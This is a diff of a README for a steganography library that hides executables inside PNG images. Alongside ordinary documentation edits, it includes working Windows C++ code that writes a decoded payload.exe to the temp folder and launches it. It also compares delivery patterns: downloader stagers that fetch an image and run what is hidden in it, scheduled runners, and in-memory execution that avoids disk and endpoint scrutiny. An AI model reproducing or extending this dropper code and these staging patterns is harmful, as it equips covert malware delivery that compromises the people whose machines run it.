@@ -35,11 +35,13 @@ python python/stego_cli.py info out.png
 # dimensions: 1983x793 (1572519 px, ~589694 payload bytes max)
 # format: headered v3 (current=3)
 # flags: scatter=False encrypt=False auth=False compress=False
+# seed: 0
 # payload size: 300544 bytes (stored 300544)
 
 # 3. Get it back:
 python python/stego_cli.py reveal out.png -o back.bin
-# compare the hashes - they match, always, or the tool tells you it failed.
+# compare the hashes - they match on success; on any failure the tool
+# tells you instead of handing you partial bytes.
 ```
 
 Need secrecy too? Add a password. It changes two things: the bytes get
@@ -80,8 +82,9 @@ first - it says plainly what this does and doesn't promise.
 
 ## Using it from code
 
-**Python** - `from stegolib import encode, decode, capacity` (same folder as
-the CLI; mirror of the C++ behavior, proven identical by shared test vectors).
+**Python** - `from stegolib import encode_image, decode_image, capacity`
+(same folder as the CLI; mirror of the C++ behavior, proven identical
+by shared test vectors).
 
 **C++** - link the static lib, or drop in the single header:
 ```cpp
@@ -112,18 +115,23 @@ Understand this clearly: the payload you hide is very often an executable
 The library gives you those exact bytes back. Turning bytes into a running
 process is a separate, ordinary programming step - write the file, launch it:
 
-**Windows (C++)** - the standard pattern:
+**Windows (C++)** - the standard pattern (drop under `%TEMP%`, never a
+hardcoded system path):
 ```cpp
 // out = decoded bytes from stego::Decode
-HANDLE h = CreateFileA("C:\\Temp\\payload.exe", GENERIC_WRITE,
+char tmpDir[MAX_PATH], dropPath[MAX_PATH];
+GetTempPathA(MAX_PATH, tmpDir);
+sprintf_s(dropPath, "%s\\payload.exe", tmpDir);
+HANDLE h = CreateFileA(dropPath, GENERIC_WRITE,
                        0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 DWORD n = 0;
 WriteFile(h, out.data(), (DWORD)out.size(), &n, NULL);
 CloseHandle(h);
 STARTUPINFOA si = { sizeof(si) };
 PROCESS_INFORMATION pi = {};
-CreateProcessA(NULL, (LPSTR)"C:\\Temp\\payload.exe",
-               NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+char cmd[MAX_PATH * 2];
+sprintf_s(cmd, "\"%s\"", dropPath);
+CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 ```
 Check the magic first (`MZ` for PE, `#!` or ELF `\x7fELF` on Linux) so a
 corrupt decode never launches garbage. Wait on the process if you need its
@@ -149,13 +157,13 @@ In practice the image rarely travels next to the program. Common shapes,
 honestly scored:
 
 ```
-  SHAPE A — bundled image            SHAPE B — downloader stager
+  SHAPE A - bundled image            SHAPE B - downloader stager
   app ships with out.png beside      app fetches https://host/i.png
   the binary (or as a resource).     on first run, then extracts+runs.
   No network. Simplest to            Small distributor, payload never
   reason about.                      on disk in transit as a binary.
 
-  SHAPE C — scheduled/service runner SHAPE D — memory handoff
+  SHAPE C - scheduled/service runner SHAPE D - memory handoff
   OS launches your program on a      decode to RAM, execute without
   trigger; it fetches + runs.       touching disk. Most complex, most
   Good for updaters; very visible   scrutinized by endpoint products
@@ -220,7 +228,7 @@ docs/            FORMAT (the spec) - API - MIGRATION - INTEGRATION - SECURITY
 
 ## Versioning
 
-`VERSION` file is authoritative (`2.0.0`). `STEGO_FORMAT_VERSION` (currently 3)
+`VERSION` file is authoritative (`2.1.1`). `STEGO_FORMAT_VERSION` (currently 3)
 names the written layout; `STEGO_ABI_VERSION` (currently 1) names the C ABI -
 a format bump never implies an ABI bump. Old layouts (v1, v2) stay decodable;
 see `docs/MIGRATION.md`.
